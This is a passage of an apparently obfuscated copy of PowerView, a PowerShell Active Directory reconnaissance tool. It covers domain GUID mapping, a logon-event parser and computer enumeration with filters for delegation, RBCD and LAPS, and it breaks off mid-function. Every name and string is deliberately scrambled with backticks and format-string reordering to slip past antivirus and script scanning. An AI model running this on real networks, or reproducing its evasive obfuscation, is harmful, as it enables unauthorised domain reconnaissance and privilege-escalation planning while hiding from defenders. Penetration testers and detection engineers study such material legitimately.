                                ("{0}{1}{2}{3}"-f 'T','argetLogon','Gui','d')   = ${prOP`ER`TIeS}[7]."VaL`UE"
                                ("{2}{1}{4}{0}{3}"-f 'rNam','getSer','Tar','e','ve')  = ${pR`Ope`RTiEs}[8]."Va`Lue"
                                ("{3}{2}{1}{0}"-f 'o','f','etIn','Targ')        = ${pRo`Per`TIEs}[9]."V`ALuE"
                                ("{1}{2}{3}{0}"-f 'd','Pro','ce','ssI')         = ${pRo`Pe`RTIes}[10]."va`lUE"
                                ("{0}{2}{3}{1}" -f 'P','ame','ro','cessN')       = ${pR`o`pER`TiEs}[11]."V`Alue"
                                ("{0}{1}{2}"-f'Ip','Ad','dress')         = ${pROp`Er`Ties}[12]."V`AluE"
                                ("{0}{1}"-f 'I','pPort')            = ${Pro`perT`IEs}[13]."VA`Lue"
                            }
                            ${oUt`PuT}."ps`ObJECt"."TY`PeN`Ames".("{0}{1}"-f 'In','sert').Invoke(0, ("{1}{5}{3}{2}{0}{4}{7}{6}" -f 't','PowerV','ici','.Expl','CredentialLo','iew','onEvent','g'))
                            ${oU`Tp`Ut}
                        }
                    }
                    default {
                        &("{0}{3}{1}{2}" -f 'Writ','Warni','ng','e-') "No handler exists for event ID: $($Event.Id) "
                    }
                }
            }
        }
    }
}


function gE`T`-D`oMaInGUiDmAp {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{3}{2}{0}"-f 's','PSShould','oces','Pr'}, '')]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param (
        [ValidateNotNullOrEmpty()]
        [String]
        ${DO`MaIN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{3}{2}{0}"-f 'ainController','D','m','o'})]
        [String]
        ${Se`Rv`er},

        [ValidateRange(1, 10000)]
        [Int]
        ${REsuLtP`AG`ESi`ZE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${sE`RvERt`i`MeLIm`IT},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CrE`d`entI`AL} =   (  Childitem  ('varIa'+'BLe'+':7t'+'Q'+'02') )."va`lue"::"emP`Ty",

        [Switch]
        ${s`sl},

        [Switch]
        ${oBfu`Sc`A`Te}
    )

    ${G`UI`ds} = @{("{0}{6}{4}{2}{1}{3}{5}" -f'00000000-00','-','00','0','-0000-00','00000000000','00') = 'All'}

    ${F`OrE`St`ARguME`NtS} = @{}
    if (${p`sB`oUNDpArAme`TERS}[("{1}{0}{3}{2}"-f'den','Cre','l','tia')]) { ${f`oResTAr`G`U`M`eNts}[("{2}{0}{1}"-f 'ia','l','Credent')] = ${cR`ED`e`NTiAL} }
    ${d`Om`A`iNDnARGUm`enTS} = @{}
    if (${PsBOUndPA`RA`meTe`RS}[("{0}{1}"-f'D','omain')]) { ${DO`maIN`dnARgU`me`N`Ts}[("{0}{1}{2}" -f 'Dom','a','in')] = ${dO`M`AIN} }
    if (${psBO`UNDpaR`AmEt`ers}[("{0}{1}" -f 'Se','rver')]) { ${D`O`m`AiNd`NargumENTs}[("{0}{1}" -f'S','erver')] = ${seR`VER} }
    if (${PS`BoUn`DparA`M`eteRs}[("{2}{1}{0}"-f 'tial','en','Cred')]) { ${d`OMaindnAR`GUmE`NTS}[("{1}{0}{2}" -f 'edenti','Cr','al')] = ${C`RedeNT`IAL} }
    if (${PSbOU`ND`PARAMET`erS}['SSL']) { ${DoM`AI`NDN`ARgum`entS}['SSL'] = ${s`sL} }


    try {
        ${sChE`mAP`A`Th} = (&("{0}{2}{1}"-f 'Ge','-Forest','t') @ForestArguments)."SC`heMA"."nA`mE"
    }
    catch {
        ${dOM`AI`NDn} = &("{1}{0}{2}{3}"-f 'n','Get-Domai','D','N') @DomainDNArguments
        if (${dom`AINdn}) {
            ${s`C`HeMApatH} = "CN=Schema,CN=Configuration,$($DomainDN)"
        }
    }
    if (-not ${SCHE`map`A`TH}) {
        throw ("{11}{7}{8}{13}{2}{4}{10}{5}{1}{12}{0}{9}{3}{6}"-f' forest schema pa',' r','p]',' f',' Error','in','rom Get-Forest','et-DomainGUI','DM','th',' ','[G','etrieving','a')
    }

    ${S`EA`RC`HeraRgUmEN`TS} = @{
        ("{2}{1}{0}" -f 'e','hBas','Searc') = ${s`ch`EmAPA`Th}
    }
    if (${P`sbO`U`N`Dp`ArAMETERS}[("{2}{1}{0}"-f'ain','m','Do')]) { ${SeAR`ChEraR`gU`me`NTS}[("{0}{1}" -f 'Do','main')] = ${dom`A`IN} }
    if (${pS`Bo`UND`Para`MEtE`RS}[("{0}{1}"-f 'Serve','r')]) { ${S`ear`cH`eRarg`UmEntS}[("{0}{1}"-f 'Serv','er')] = ${sEr`V`ER} }
    if (${Ps`BoU`ND`ParaMEt`eRS}[("{1}{3}{2}{0}" -f'PageSize','R','ult','es')]) { ${Se`Arc`h`eraR`g`UmeNtS}[("{3}{2}{1}{0}" -f'ageSize','tP','esul','R')] = ${re`SU`LTpa`Ges`iZe} }
    if (${psb`OUN`dPARa`M`e`TERs}[("{2}{4}{3}{0}{1}" -f 'eLimi','t','Serve','Tim','r')]) { ${sEaRCHErA`Rgu`MEN`Ts}[("{1}{0}{3}{2}" -f'erT','Serv','meLimit','i')] = ${sE`R`V`ERTim`eLImIT} }
    if (${p`S`BOuNdp`A`RaMEt`Ers}[("{2}{1}{0}"-f 'al','denti','Cre')]) { ${sEaRCh`eRAr`G`UmE`Nts}[("{3}{2}{0}{1}"-f'a','l','enti','Cred')] = ${C`REdEn`T`Ial} }
    if (${pS`BOUnd`P`ARAmEtE`RS}['SSL']) { ${sEa`R`Ch`eRARgUMeN`Ts}['SSL'] = ${s`Sl} }

    ${LDa`PFI`LTeR} = ("{0}{2}{4}{3}{1}" -f '(sch','*)','e','=','maIDGUID')
    try {
        ${REsu`LTs} = &("{0}{3}{2}{1}{4}" -f'Inv','Qu','-LDAP','oke','ery') @SearcherArguments -LDAPFilter "$LDAPFilter"
        ${re`S`UlTS} | &("{3}{2}{1}{0}" -f 't','e-Objec','er','Wh') {${_}} | &("{0}{2}{1}"-f'F','ect','orEach-Obj') {
            if (&("{0}{2}{1}" -f'Get','ber','-Mem') -inputobject ${_} -name ("{2}{0}{1}" -f 'ttrib','utes','A') -Membertype ("{2}{1}{0}"-f 'es','erti','Prop')) {
                ${P`Rop} = @{}
                foreach (${a} in ${_}."ATTR`iB`UtES"."kE`ys" | &("{1}{2}{3}{0}"-f 'bject','S','or','t-O')) {
                    if ((${a} -eq ("{0}{2}{1}" -f'ob','ectsid','j')) -or (${A} -eq ("{1}{3}{0}{2}"-f 'r','sidhis','y','to')) -or (${a} -eq ("{0}{1}{2}" -f 'o','bject','guid')) -or (${A} -eq ("{3}{0}{4}{1}{2}"-f'er','e','rtificate','us','c')) -or ${A} -eq ("{0}{1}{2}"-f 'sche','maid','guid')) {
                        ${P`RoP}[${a}] = ${_}."AT`TrIB`U`Tes"[${A}]
                    }
                    else {
                        ${VALU`es} = @()
                        foreach (${V} in ${_}."a`TTriB`UTes"[${a}]."G`e`TValuES"([byte[]])) {
                            ${val`UES} +=   (gEt-variaBLE ("m1l"+"C")  )."V`AlUe"::"u`Tf8"."GetSt`R`iNg"(${V})
                        }
                        ${p`ROp}[${A}] = ${V`Alu`eS}
                    }
                }
            }
            else {
                ${pr`op} = ${_}."Pr`O`pERT`iEs"
            }

            ${GU`i`dS}[(&("{3}{0}{1}{2}" -f 'w-Ob','jec','t','Ne') ("{1}{0}" -f 'id','Gu') (,${pr`oP}."s`chemAidg`UID"[0]))."gu`ID"] = ${p`RoP}."Na`me"[0]
        }
        if (${R`eSULtS}) {
            try { ${R`ESUlTS}.("{1}{0}"-f'pose','dis').Invoke() }
            catch {
                &("{1}{0}{2}"-f'te-Ver','Wri','bose') ('[Get-'+'Dom'+'ainGU'+'ID'+'Map]'+' '+'E'+'rr'+'or '+'disp'+'osin'+'g '+'o'+'f '+'th'+'e '+'Re'+'sult'+'s '+'o'+'bject'+': '+"$_")
            }
        }
    }
    catch {
        &("{3}{1}{0}{2}"-f'e-Ve','t','rbose','Wri') ('[Get-DomainG'+'U'+'ID'+'Map] '+'Er'+'ror '+'i'+'n '+'buil'+'ding'+' '+'GUI'+'D '+'m'+'ap: '+"$_")
    }

    ${SearC`h`ErA`RguMe`N`Ts}[("{2}{1}{0}"-f 'ase','hB','Searc')] = ${SC`hEM`APAtH}.("{0}{2}{1}"-f 'rep','ace','l').Invoke(("{0}{1}"-f 'Sch','ema'),("{0}{1}{4}{3}{2}" -f'E','x','Rights','ded-','ten'))
    ${L`dApf`IL`TER} = ("{1}{5}{8}{0}{3}{7}{2}{6}{4}"-f 'n','(','i','trolAcce','t)','obj','gh','ssR','ectClass=co')

    try {
        ${r`eSuL`Ts} = &("{3}{2}{4}{1}{0}" -f'uery','-LDAPQ','nvok','I','e') @SearcherArguments -LDAPFilter "$LDAPFilter"
        ${RE`SuLtS} | &("{3}{2}{1}{0}"-f'ject','b','O','Where-') {${_}} | &("{2}{1}{0}{3}" -f'je','b','ForEach-O','ct') {
            if (&("{1}{2}{0}"-f 'ber','Get','-Mem') -inputobject ${_} -name ("{0}{1}{2}" -f 'At','trib','utes') -Membertype ("{3}{2}{0}{1}" -f'ie','s','t','Proper')) {
                ${pr`OP} = @{}
                foreach (${A} in ${_}."atT`Rib`UTES"."K`EyS" | &("{3}{0}{1}{2}" -f 'rt-O','bjec','t','So')) {
                    if ((${A} -eq ("{2}{1}{0}"-f 'ctsid','bje','o')) -or (${A} -eq ("{2}{0}{1}" -f'dhist','ory','si')) -or (${A} -eq ("{0}{1}{2}"-f 'objectg','u','id')) -or (${a} -eq ("{1}{2}{3}{0}" -f'ficate','use','r','certi'))) {
                        ${P`RoP}[${A}] = ${_}."At`TRIbuT`eS"[${A}]
                    }
                    else {
                        ${v`Al`UES} = @()
                        foreach (${V} in ${_}."aTT`R`IBuT`es"[${A}]."gEtVa`LU`ES"([byte[]])) {
                            ${Va`Lu`ES} +=   (  geT-vArIABLE ("{1}{0}" -f'1LC','m')  )."Val`UE"::"U`TF8"."geTST`R`iNg"(${V})
                        }
                        ${PR`OP}[${A}] = ${vAl`Ues}
                    }
                }
            }
            else {
                ${P`RoP} = ${_}."PrOp`E`RTiEs"
            }

            ${Gu`ids}[${P`RoP}."RI`g`HtSgUId"[0].("{0}{1}{2}" -f'toStri','n','g').Invoke()] = ${P`Rop}."n`Ame"[0]
        }
        if (${R`ESul`TS}) {
            try { ${RES`ULTs}.("{1}{2}{0}"-f 'se','di','spo').Invoke() }
            catch {
                &("{2}{0}{1}" -f'-Ver','bose','Write') ('[G'+'et-'+'DomainG'+'U'+'IDMa'+'p]'+' '+'Err'+'or '+'di'+'spos'+'i'+'ng '+'of'+' '+'th'+'e '+'R'+'esul'+'ts '+'o'+'b'+'ject: '+"$_")
            }
        }
    }
    catch {
        &("{0}{3}{2}{1}"-f'W','e','-Verbos','rite') ('[G'+'et-'+'Do'+'mainGUI'+'D'+'Map] '+'E'+'rror '+'in'+' '+'bui'+'lding '+'G'+'UID '+'map:'+' '+"$_")
    }

    ${g`UIDS}
}


function gEt-D`OmaInCOm`P`Ut`eR {


    [OutputType({"{4}{0}{1}{2}{3}"-f'werView.C','omp','ut','er','Po'})]
    [OutputType({"{2}{0}{1}{3}{4}"-f 'owerView','.','P','Computer.','Raw'})]
    [CmdletBinding()]
    Param (
        [Parameter(POsiTion = 0, valUefRoMPIPElINE = ${T`Rue}, vAlUefRoMpiPEliNeByproPErTynaMe = ${t`RUE})]
        [Alias({"{1}{3}{0}{2}"-f 'ccountN','S','ame','amA'}, {"{0}{1}"-f 'Nam','e'}, {"{0}{2}{3}{1}" -f'D','stName','NS','Ho'})]
        [String[]]
        ${ID`ENtIty},

        [Switch]
        ${unC`ON`sTRAI`NEd},

        [Switch]
        ${t`R`US`TEd`TOauTh},

        [Switch]
        ${rB`cD},

        [Switch]
        ${Pr`i`NtErs},

        [Switch]
        ${exC`L`Ud`edcs},

        [ValidateNotNullOrEmpty()]
        [Alias({"{4}{3}{1}{0}{2}" -f 'l','rvicePrincipa','Name','e','S'})]
        [String]
        ${S`PN},

        [ValidateNotNullOrEmpty()]
        [String]
        ${OPe`RAtINgS`YST`eM},

        [ValidateNotNullOrEmpty()]
        [String]
        ${S`Er`VICEpA`CK},

        [ValidateNotNullOrEmpty()]
        [String]
        ${SiTEn`AME},

        [Switch]
        ${PI`Ng},

        [ValidateRange(1, 10000)]
        [Int]
        ${lA`s`TlOgon},

        [Switch]
        ${hAS`L`ApS},

        [Switch]
        ${n`o`lapS},

        [Switch]
        ${can`R`E`AdLaPS},

        [ValidateNotNullOrEmpty()]
        [String]
        ${dOM`AIN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}" -f'Fil','ter'})]
        [String]
        ${l`DApF`i`lTEr},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${p`R`oPERti`ES},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}{2}" -f 'DS','A','Path'})]
        [String]
        ${S`e`ARchBase},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{2}{0}{4}{3}" -f 'ontrol','Domain','C','er','l'})]
        [String]
        ${S`ER`Ver},

        [ValidateSet({"{1}{0}" -f 'se','Ba'}, {"{0}{2}{1}" -f 'OneLev','l','e'}, {"{1}{0}" -f 'tree','Sub'})]
        [String]
        ${Se`A`RCHSCO`pe} = ("{2}{0}{1}" -f're','e','Subt'),

        [ValidateRange(1, 10000)]
        [Int]
        ${R`ESu`LTpag`E`SIze} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${SeRv`er`TIme`Li`mIT},

        [ValidateSet({"{0}{1}" -f'Dac','l'}, {"{0}{1}"-f'Gr','oup'}, {"{0}{1}"-f 'No','ne'}, {"{1}{0}"-f'er','Own'}, {"{1}{0}"-f'cl','Sa'})]
        [String]
        ${sEcU`RiTyM`AS`KS},

        [Switch]
        ${T`omb`StoNe},

        [Alias({"{0}{1}{2}" -f'R','et','urnOne'})]
        [Switch]
        ${f`IN`DONe},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${crE`dENT`IaL} =   ( lS  ("Va"+"Ri"+"AB"+"lE:7t"+"Q02") )."vA`lUE"::"eMp`TY",

        [Switch]
        ${R`AW},

        [Switch]
        ${S`Sl},

        [Switch]
        ${ob`Fus`CA`Te}
    )

    DynamicParam {
        ${UA`CvA`LUENA`m`ES} =   ( vARiABLE ('G'+'604')  -Value  )::("{2}{1}{0}" -f 'ames','tN','Ge').Invoke(${Uac`ENuM})
        
        ${UaCv`A`lUEna`meS} = ${uAc`V`ALuEN`AmEs} | &("{4}{0}{1}{2}{3}" -f'r','Each-Obje','c','t','Fo') {${_}; "NOT_$_"}
        
        &("{0}{5}{3}{2}{1}{4}" -f'N','et','am','ar','er','ew-DynamicP') -Name ("{2}{1}{0}"-f 'ilter','ACF','U') -ValidateSet ${Uacv`A`lUe`NA`meS} -Type ([array])
    }

    BEGIN {
        ${SE`ARChe`RargU`m`eN`Ts} = @{}
        if (${pSbOu`N`d`PArAmEtERs}[("{0}{1}" -f'Dom','ain')]) { ${se`ARch`eRarguMe`NTS}[("{1}{0}" -f 'ain','Dom')] = ${dOM`AiN} }
        if (${ps`B`O`U`N`DparAmeTerS}[("{0}{2}{1}" -f 'Pro','rties','pe')]) { ${SEAr`cHerA`R`GU`M`enTs}[("{2}{0}{1}" -f'erti','es','Prop')] = ${pr`OPERT`I`es} }
        if (${pSB`o`UNdp`ARa`mete`Rs}[("{1}{0}{2}" -f 'rch','Sea','Base')]) { ${s`eAr`CheRa`Rgum`En`Ts}[("{1}{2}{0}"-f'hBase','Sear','c')] = ${sEa`RC`HB`Ase} }
        if (${p`sbo`UNdPar`AM`Eters}[("{0}{2}{1}" -f 'Ser','r','ve')]) { ${s`EarCHER`ARG`UmENts}[("{0}{1}" -f'Serv','er')] = ${SEr`VEr} }
        if (${p`sbO`Und`PaRA`MeTE`RS}[("{0}{2}{1}" -f'S','e','earchScop')]) { ${Se`ArCHE`R`ArGuM`en`TS}[("{2}{0}{1}" -f 'earchScop','e','S')] = ${SeAr`C`hScoPE} }
        if (${PsBOUND`PaRA`M`Ete`Rs}[("{1}{2}{0}"-f'ze','Result','PageSi')]) { ${sEAR`ch`ER`ARGUmeN`Ts}[("{2}{3}{0}{1}" -f 'Si','ze','Resu','ltPage')] = ${res`UlTpAG`ES`iZe} }
        if (${Psbo`UnDp`Ar`AMET`ers}[("{2}{3}{1}{0}"-f 'imeLimit','T','Serve','r')]) { ${se`ArcherA`RGUMEn`TS}[("{2}{3}{0}{4}{1}"-f 'rTi','mit','Serv','e','meLi')] = ${se`Rve`R`TImEl`imiT} }
        if (${PsBOu`NDpa`RaMe`TerS}[("{0}{3}{2}{1}"-f 'Securi','s','k','tyMas')]) { ${SEA`RcHe`RaRGum`EntS}[("{2}{3}{0}{1}"-f'Ma','sks','Securit','y')] = ${SE`C`UriTymA`SkS} }
        if (${PSbOUnd`p`A`R`Am`EterS}[("{3}{1}{0}{2}"-f'to','s','ne','Tomb')]) { ${se`ArcH`ERArGu`mE`Nts}[("{3}{2}{0}{1}" -f 'bsto','ne','om','T')] = ${ToMbst`o`Ne} }
        if (${psb`O`U`NDPaRaM`eTERs}[("{0}{1}{2}"-f 'Cred','enti','al')]) { ${S`eA`R`chERarg`UmentS}[("{0}{2}{1}" -f 'Credent','l','ia')] = ${CRed`eNT`i`Al} }
        if (${PSBOUND`P`AR`A`mEteRS}['SSL']) { ${se`ARCHE`RARguM`eNTs}['SSL'] = ${S`Sl} }
        if (${p`SBOuNdPaR`A`M`eTERs}[("{0}{1}"-f'Obfuscat','e')]) {${SeA`RCh`ErA`RgumeNTs}[("{2}{0}{1}"-f'f','uscate','Ob')] = ${ob`Fus`c`Ate} }
        if (${pSbo`U`NDparaMeT`ERS}[("{1}{2}{0}" -f 'ndOne','F','i')]) { ${S`ea`RchERAR`G`UMenTs}[("{0}{1}{2}" -f'F','ind','One')] = ${FI`NDoNe} }

        ${dnsEarCHERaR`g`U`Me`N`TS} = @{}
        if (${PSb`o`U`NDpAR`AMETers}[("{1}{0}" -f'omain','D')]) { ${dnse`Ar`cH`ERA`RGU`MeN`TS}[("{1}{0}"-f 'omain','D')] = ${do`m`AiN} }
        if (${P`S`BoU`N`dpARAmeTERS}[("{0}{1}"-f'Ser','ver')]) { ${DN`Sea`RChErArGum`enTs}[("{1}{0}"-f 'r','Serve')] = ${S`erVEr} }
        if (${Ps`B`OuNDPar`Am`e`TerS}['SSL']) { ${DnSEaR`C`hE`R`Arg`UMentS}['SSL'] = ${s`SL} }
        if (${PSBOUnDP`ARAM`ETe`RS}[("{1}{2}{0}{3}" -f'c','Ob','fus','ate')]) {${DNS`e`ArcHe`R`ARgUmenTs}[("{0}{2}{1}" -f'Obfu','cate','s')] = ${O`Bf`Us`CatE} }

    }

    PROCESS {
        
        if (${PSBOun`dPar`AME`TE`RS} -and (${PSbO`UNd`ParaMeT`erS}."cO`Unt" -ne 0)) {
            &("{4}{3}{2}{1}{0}"-f'ameter','ynamicPar','-D','ew','N') -CreateVariables -BoundParameters ${PsBOunDpaRa`me`T`ErS}
        }

        ${IDeNtI`T`YFil`TER} = ''
        ${F`I`LtEr} = ''
        ${IdeNT`I`Ty} | &("{1}{2}{0}" -f'Object','Wher','e-') {${_}} | &("{1}{0}{2}"-f'ch-Ob','ForEa','ject') {
            ${idEnt`I`TYinS`TA`NCe} = ${_}.("{0}{1}"-f'Rep','lace').Invoke('(', '\28').("{0}{1}"-f 'Rep','lace').Invoke(')', '\29')
            if (${IDen`TIt`YIns`TanCe} -match ("{1}{0}"-f '-1-','^S')) {
                ${IDeNTi`TY`Fi`lT`er} += "(objectsid=$IdentityInstance)"
            }
            elseif (${Ide`N`TI`TYINST`A`Nce} -match ("{1}{0}" -f'CN=','^')) {
                ${Ide`NTiT`y`F`ilter} += "(distinguishedname=$IdentityInstance)"
                if ((-not ${PsBounD`p`A`RaMetErs}[("{2}{0}{1}" -f'i','n','Doma')]) -and (-not ${psB`o`UNdpa`R`AMETERs}[("{1}{0}{2}" -f'earchBas','S','e')])) {
                    
                    
                    ${iDeN`T`ItyDoma`IN} = ${id`EnTItYIn`St`AnCe}.("{0}{1}" -f'SubStrin','g').Invoke(${iDE`NtityI`Nsta`NCe}.("{2}{0}{1}"-f 'ndexO','f','I').Invoke('DC=')) -replace 'DC=','' -replace ',','.'
                    &("{1}{0}{2}{3}"-f'r','W','ite-Verbos','e') ('[G'+'et-Domai'+'n'+'Co'+'m'+'put'+'er] '+'Extra'+'c'+'ted'+' '+'doma'+'in '+"'$IdentityDomain' "+'f'+'rom '+"'$IdentityInstance'")
                    ${s`eA`RcHE`R`ARGuMEN`TS}[("{0}{1}{2}"-f 'D','o','main')] = ${i`DEN`TItYD`om`AIN}
                    ${cOM`psearc`heR} = &("{2}{0}{3}{1}" -f 'inSe','her','Get-Doma','arc') @SearcherArguments
                    if (-not ${CO`MpS`EArCH`er}) {
                        &("{0}{1}{2}{3}" -f 'Writ','e-','War','ning') ('['+'Get-'+'Domai'+'nComputer]'+' '+'U'+'nabl'+'e '+'to'+' '+'re'+'tr'+'ieve '+'dom'+'ain'+' '+'sear'+'ch'+'er '+'f'+'or '+"'$IdentityDomain'")
                    }
                }
            }
            elseif (${i`d`entItyi`N`st`ANCE}.("{1}{0}" -f'ns','Contai').Invoke('.')) {
                ${Ide`Nt`I`T`yfiltEr} += "(|(name=$IdentityInstance)(dnshostname=$IdentityInstance))"
            }
            elseif (${i`dEnT`it`Yin`STAnce} -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                ${gUI`dBYtE`stR`I`NG} = (([Guid]${I`dEnTiTYiN`S`TaNce}).("{2}{0}{1}"-f 'ByteArra','y','To').Invoke() | &("{2}{0}{1}{3}"-f 'Each-Ob','je','For','ct') { '\' + ${_}.("{1}{2}{0}"-f 'ring','T','oSt').Invoke('X2') }) -join ''
                ${IDeN`Tityf`I`lter} += "(objectguid=$GuidByteString)"
            }
            else {
                ${iDen`TI`TYFIl`TEr} += "(name=$IdentityInstance)"
            }
        }
        if (${IdENti`Ty`FI`lTeR} -and (${iD`E`NTITYfiL`T`eR}.("{1}{0}"-f 'm','Tri').Invoke() -ne '') ) {
            ${FI`Lt`ER} += "(|$IdentityFilter)"
        }

        if (${p`sb`OU`NdPaRaM`Et`Ers}[("{1}{0}{2}{3}"-f 'con','Un','straine','d')]) {
            &("{3}{2}{1}{0}" -f 'se','e-Verbo','t','Wri') ("{13}{9}{5}{3}{16}{11}{2}{1}{0}{7}{8}{4}{10}{6}{15}{12}{14}" -f 'h f',' wit','uters','ch',' unconstr','ter] Sear','ined','o','r','inCompu','a','or comp','el','[Get-Doma','egation',' d','ing f')
            ${fI`Lt`er} += (("{3}{5}{8}{6}{9}{10}{7}{4}{0}{1}{2}"-f '=','52428','8)','(user',':','A','2.84','3','ccountControl:1.','0.113556.1.','4.80'))
        }
        if (${psBo`U`NDPA`Rame`TE`Rs}[("{0}{2}{1}" -f'Tr','ToAuth','usted')]) {
            &("{1}{2}{0}" -f'e-Verbose','Wr','it') ("{11}{8}{9}{22}{19}{18}{7}{15}{13}{2}{10}{17}{14}{12}{21}{6}{4}{20}{5}{0}{1}{3}{16}"-f'er p','ri',' comp','n',' authen',' for oth','d to','rch','a','inCo','uters that','[Get-Dom',' ','or','are','ing f','cipals',' ','a','er] Se','ticate','truste','mput')
            ${F`iLT`Er} += ("{0}{1}{2}{3}{5}{8}{7}{4}{6}"-f '(','msds','-all','owedt','t','o','o=*)','egate','del')
        }
        if (${p`sBoun`DPARAmeTe`Rs}[("{0}{1}" -f 'RB','CD')]) {
            &("{2}{0}{1}{3}" -f 'ite-','V','Wr','erbose') ("{15}{9}{21}{2}{28}{17}{5}{24}{1}{26}{29}{13}{12}{7}{10}{30}{18}{14}{22}{16}{8}{23}{4}{11}{25}{0}{3}{6}{27}{20}{19}"-f'd','rchin','n',' constrain','ource','puter] Se','e','mp','ow','-Dom','uters th','-b','co',' ','conf','[Get','ured to all','om','e ','on','delegati','ai','ig',' res','a','ase','g f','d ','C','or','at ar')
            ${FiL`TeR} += (("{11}{0}{12}{5}{8}{1}{6}{9}{2}{3}{10}{4}{13}{7}"-f 'sds-','f','e','rid','nt','toacto','ot',')','nbehalfo','h','e','(m','allowed','ity=*'))
        }
        if (${p`sb`ou`NDPa`RAM`EtERS}[("{1}{0}{2}" -f 'r','Printe','s')]) {
            &("{0}{1}{3}{2}"-f 'W','r','erbose','ite-V') ("{4}{2}{3}{0}{8}{6}{7}{5}{9}{1}{10}"-f 'Co','printer','Get-','Domain','[','arching f','ut','er] Se','mp','or ','s')
            ${FIl`TeR} += (("{5}{0}{4}{6}{2}{3}{1}" -f 't','ueue)','rint','Q','Category=','(objec','p'))
        }
        if (${ps`B`ouN`DPaR`AMeT`ErS}[("{2}{1}{0}" -f's','DC','Exclude')]) {
            &("{2}{3}{0}{1}"-f's','e','Write-V','erbo') ("{12}{8}{7}{5}{3}{9}{11}{1}{10}{6}{0}{4}{2}" -f'c','d','s','n','ontroller','] Excludi','in ','er','nComput','g','oma',' ','[Get-Domai')
            ${F`ilTer} += (("{8}{6}{3}{5}{9}{4}{13}{12}{11}{1}{0}{2}{7}{10}" -f'.113556.1.4.8',':1.2.840','03:','rAcco','tC','u','e','=8192)','(!(us','n',')','ol','tr','on'))
        }
        if (${p`sBOuNd`pAR`AMetErs}['SPN']) {
            &("{0}{1}{2}"-f'Write-','Verbos','e') ('[Ge'+'t'+'-D'+'omainCompu'+'ter] '+'Searc'+'hin'+'g '+'fo'+'r '+'compu'+'ters'+' '+'wi'+'th '+'SPN:'+' '+"$SPN")
            ${f`IL`TER} += "(servicePrincipalName=$SPN)"
        }
        if (${PSBou`NdPA`R`Ame`TErS}[("{0}{2}{4}{1}{3}" -f 'Opera','t','ti','em','ngSys')]) {
            &("{1}{0}{2}" -f 'erbo','Write-V','se') ('['+'G'+'et-D'+'omai'+'nCo'+'mp'+'uter] '+'Se'+'archin'+'g '+'f'+'or '+'c'+'omputer'+'s '+'w'+'ith '+'opera'+'t'+'i'+'ng '+'sys'+'te'+'m: '+"$OperatingSystem")
            ${fI`LteR} += "(operatingsystem=$OperatingSystem)"
        }
        if (${pS`B`ouND`pAr`AMeTerS}[("{2}{1}{3}{0}" -f'ack','ervice','S','P')]) {
            &("{2}{0}{3}{1}" -f 'e','se','Write-V','rbo') ('[Get'+'-Domai'+'nCo'+'mputer] '+'S'+'e'+'arching '+'fo'+'r '+'compu'+'t'+'ers '+'wit'+'h '+'servi'+'ce '+'pack:'+' '+"$ServicePack")
            ${f`I`lTER} += "(operatingsystemservicepack=$ServicePack)"
        }
        if (${psBou`N`dPaRaME`TERs}[("{2}{1}{0}"-f 'e','teNam','Si')]) {
            &("{1}{0}{2}" -f'b','Write-Ver','ose') ('[G'+'e'+'t-D'+'omain'+'Comp'+'uter'+'] '+'Sea'+'rching'+' '+'f'+'or '+'com'+'puter'+'s '+'wi'+'th '+'site'+' '+'na'+'me'+': '+"$SiteName")
            ${FI`l`TEr} += "(serverreferencebl=$SiteName)"
        }
        if (${PSB`O`UNdPAR`Am`eTErs}[("{1}{2}{0}" -f'gon','LastL','o')]) {
            &("{1}{3}{2}{0}"-f 'ose','Wr','e-Verb','it') ('['+'G'+'et-Domain'+'Co'+'mpute'+'r] '+'Se'+'ar'+'c'+'hing '+'fo'+'r '+'comp'+'uter'+' '+'acco'+'unts'+' '+'that'+' '+'have'+' '+'lo'+'g'+'ged '+'on'+' '+'wit'+'hin'+' '+'t'+'he '+'last'+' '+"$PSBoundParameters['LastLogon'] "+'day'+'s')
            ${LOg`oNdA`Te} = (&("{1}{2}{0}" -f'Date','G','et-'))."ADd`da`yS"(-${P`SboUN`d`pA`RaMeteRs}[("{2}{1}{0}"-f'Logon','ast','L')]).("{1}{3}{2}{0}"-f 'me','To','Ti','File').Invoke()
            ${fI`lTEr} += "(lastlogon>=$LogonDate)"
        }
        if ((${PS`B`ound`ParAmeTERS}[("{0}{2}{1}" -f 'H','APS','asL')]) -or (${P`S`Boun`dPARAmETers}[("{0}{1}" -f 'NoLAP','S')]) -or (${P`sbOu`NdP`ArAMEtErs}[("{0}{2}{1}" -f'Ca','APS','nReadL')])) {
            ${sc`he`Madn} = "CN=Schema,CN=Configuration,$(Get-DomainDN @DNSearcherArguments) "
            ${at`Trfi`lTER} = ''
            &("{0}{3}{1}{2}"-f'Write-Ve','s','e','rbo') ('['+'Ge'+'t-DomainComp'+'ut'+'er] '+'U'+'sing '+'dis'+'ti'+'ngu'+'ish'+'ed '+'name:'+' '+"$SchemaDN")
            if (${P`Sb`ou`Nd`pAramE`TErS}[("{1}{2}{0}"-f 'PS','Has','LA')]) {
                
                
                &("{1}{2}{0}{3}"-f'm','Get-D','o','ainObject') -SearchBase ${sChe`ma`dn} -LDAPFilter (("{3}{2}{0}{1}" -f'e=ms-*','-admpwd*)','m','(na')) -Properties ("{0}{1}" -f 'na','me') @SearcherArguments | &("{2}{0}{1}" -f'ele','ct','s') -expand ("{1}{0}"-f 'me','na') | &("{3}{4}{1}{0}{2}"-f 'j','b','ect','For','Each-O') {
                    &("{1}{0}{2}{3}"-f 'e-Ve','Writ','rbo','se') ('['+'Get-Do'+'mainCo'+'mp'+'u'+'te'+'r] '+'Se'+'a'+'rching'+' '+'for'+' '+'att'+'ribut'+'e:'+' '+"$_")
                    ${AttRfiL`T`er} += "($_=*)"
                }
                if (${a`TTRfIL`TER}) { ${fil`TER} += "(|$AttrFilter)" }
            }
